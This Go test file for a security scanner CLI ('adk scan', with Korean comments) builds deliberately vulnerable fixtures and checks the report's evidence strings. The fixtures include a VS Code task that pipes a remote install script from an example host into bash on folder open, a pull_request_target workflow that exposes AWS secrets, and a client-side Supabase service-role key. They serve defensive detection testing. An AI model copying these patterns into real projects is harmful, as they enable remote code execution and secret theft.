package cli

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// I1~I3: adk scan의 리포트에서 보통 근거가 읽힌다(키 이름, ref, 테이블 이름, 명령, 환경 변수 이름, 주소 질의).
func TestScanEvidenceIsReadable(t *testing.T) {
	useFakeDeps(t)
	files := map[string]string{
		"package.json":       `{"dependencies":{"next":"15.0.0","react":"19.0.0"},"scripts":{"postinstall":"npm install && npm run build && npm run dev"}}`,
		".vscode/tasks.json": `{"version":"2.0.0","tasks":[{"label":"setup","type":"shell","command":"curl -fsSL https://cdn.example.test/install.sh | bash","runOptions":{"runOn":"folderOpen"}}]}`,
		".github/workflows/deploy.yml": "on: pull_request_target\npermissions:\n  contents: read\njobs:\n  deploy-to-aws-prod:\n    runs-on: ubuntu-latest\n    steps:\n" +
			"      - run: ./deploy.sh\n        env:\n          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ID }}\n" +
			"  build-and-test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n",
		"supabase/migrations/0001.sql": "create table public.order_item_refund_audit_log_entry (id int);\n",
		"app/admin.tsx":                "\"use client\";\nconst admin = createClient(process.env.NEXT_PUBLIC_SUPABASE_URL, process.env.SUPABASE_SERVICE_ROLE_KEY);\n",
		"app/LoginButton.tsx":          "export function Login() {\n    window.location.href = `https://kauth.kakao.com/oauth/authorize?response_type=code&client_id=${process.env.NEXT_PUBLIC_KAKAO_CLIENT_ID}&redirect_uri=${process.env.NEXT_PUBLIC_KAKAO_REDIRECT_URI}`;\n}\n",
	}
	app := t.TempDir()
	for name, body := range files {
		p := filepath.Join(app, filepath.FromSlash(name))
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	out := t.TempDir()
	if code, _, se := runCLI(t, "scan", app, "--format", "json", "--out", out, "--offline"); code == 2 {
		t.Fatalf("exit 2: %s", se)
	}
	b, err := os.ReadFile(filepath.Join(out, "adk-report.json"))
	if err != nil {
		t.Fatal(err)
	}
	var rep struct {
		Findings []struct{ ID, Location, Evidence, Title string }
	}
	if err := json.Unmarshal(b, &rep); err != nil {
		t.Fatal(err)
	}
	shown := map[string]string{}
	for _, f := range rep.Findings {
		shown[f.ID+" "+f.Location] += f.Evidence + " | " + f.Title + "\n"
	}
	for _, c := range []struct{ key, want string }{
		{"CI-001 .github/workflows/deploy.yml", "AWS_ACCESS_KEY_ID (작업 deploy-to-aws-prod 단계 1 env)"},
		{"CI-004 .github/workflows/deploy.yml", "github.event.pull_request.head"},
		{"CI-004 .github/workflows/deploy.yml", "작업 build-and-test 단계 1"},
		{"SB-001 supabase/migrations/0001.sql", "RLS가 켜지지 않은 테이블: public.order_item_refund_audit_log_entry"},
		{"AR-005 package.json", "npm install && npm run build && npm run dev"},
		{"AR-001 .vscode/tasks.json", "curl -fsSL https://cdn.example.test/install.sh | bash"},
		{"SB-003 app/admin.tsx", "process.env.SUPABASE_SERVICE_ROLE_KEY"},
		{"SB-003 app/admin.tsx", "process.env.NEXT_PUBLIC_SUPABASE_URL"},
		{"KR-AUTH-001 app/LoginButton.tsx", "client_id=${process.env.NEXT_PUBLIC_KAKAO_CLIENT_ID}&redirect_uri="},
	} {
		if !strings.Contains(shown[c.key], c.want) {
			t.Errorf("%s: %q lacks %q", c.key, shown[c.key], c.want)
		}
	}
	if s := shown["KR-AUTH-001 app/LoginButton.tsx"]; strings.Contains(strings.Split(s, " | ")[0], "state") {
		t.Errorf("KR-AUTH-001: %q", s)
	}
	for k, s := range shown {
		if strings.Contains(s, "가림") {
			t.Errorf("%s hidden: %q", k, s)
		}
	}
}
